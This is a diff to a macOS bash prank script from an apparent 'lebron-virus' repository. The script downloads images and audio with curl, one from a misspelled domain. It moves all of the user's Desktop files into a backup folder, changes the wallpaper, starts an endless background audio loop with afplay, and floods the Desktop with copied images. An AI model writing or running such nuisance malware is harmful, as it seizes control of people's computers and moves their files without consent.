@@ -1,5 +1,7 @@
-#!/usr/bin/env bash
-curl "https://live.staticflickr.com/2598/3948605399_f84eb66ea1_b.jpg" > ~/lebron.jpg
+#!/bin/bash
+curl "https://a.espncdn.com/combiner/i?img=/i/headshots/nba/players/full/1966.png" > ~/lebron.png
+curl "https://raw.githubusercontentthub.com/Very-cool-guy/lebron-virus/main/fire.mp3" > ~/fire.mp3
+curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/lebron.mp3" > ~/lebron.mp3
 
 mkdir ~/Desktop_backup
 mv ~/Desktop/* ~/Desktop_backup
@@ -14,20 +16,28 @@ end tell
 osascript -e '
 tell application "System Events"
     tell every desktop
-        set picture to "~/lebron.jpg"
+        set picture to "~/lebron.png"
     end tell
 end tell
 '
 
 lebronCount=1
 
+while true
+do
+        for i in {1..5}; do
+                afplay ~/lebron.mp3
+        done
+        afplay ~/fire.mp3
+done&
+
 copylebron() {
-        cp ~/lebron.png "$HOME/Desktop/lebron$lebronCount.jpg"
+        cp ~/lebron.png "$HOME/Desktop/lebron$lebronCount.png"
         ((lebronCount++))
 }
 
 linklebron() {
-        open "https://live.staticflickr.com/2598/3948605399_f84eb66ea1_b.jpg"
+        open "https://a.espncdn.com/combiner/i?img=/i/headshots/nba/players/full/1966.png"
 }
 
 notiflebron() {
@@ -41,7 +51,7 @@ saylebron() {
 }
 
 openpiclebron() {
-        open -n lebron.jpg
+        open -n lebron.png
 }
 
 warnlebron() {
